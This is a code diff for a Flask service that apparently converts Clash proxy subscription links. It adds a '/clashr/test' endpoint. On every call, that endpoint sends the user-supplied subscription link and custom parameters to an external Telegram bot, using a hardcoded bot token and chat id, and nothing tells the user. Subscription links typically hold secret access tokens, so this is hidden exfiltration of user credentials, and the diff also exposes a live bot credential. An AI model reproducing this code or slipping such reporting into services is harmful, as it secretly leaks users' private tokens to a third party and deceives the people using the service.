@@ -11,6 +11,7 @@ import json
 import time
 import api.qx
 import api.loon
+import api.group
 from flask import Flask,render_template,request
 urllib3.disable_warnings()
 
@@ -368,6 +369,29 @@ def clashapi():
             return writeRules(sub,arg)
         else :
             return  writeRulescustom(sub,custom,arg)
+    except Exception as e:
+        return '检测调用格式是否正确'+ aff
+
+@app.route('/clashr/test', methods=['GET', 'POST'])
+def clashapitest():
+    try:
+        sub = request.args.get('sublink')
+        #print(sub)
+        try:
+            arg = request.args.get('selectfirst')
+        except Exception as e:
+            arg = 'no'
+        #print(arg)
+        try:
+            custom = request.args.get('custom')
+        except Exception as e:
+            custom = ''
+        #print(custom)
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_ClashAPI : \n'+sub+' :'+str(custom)))
+        if custom == '' or custom == None :
+            return writeRules(sub,arg)
+        else :
+            return  api.group.writeRulescustom(sub,custom,arg)
     except Exception as e:
         return '检测调用格式是否正确'+ aff
 
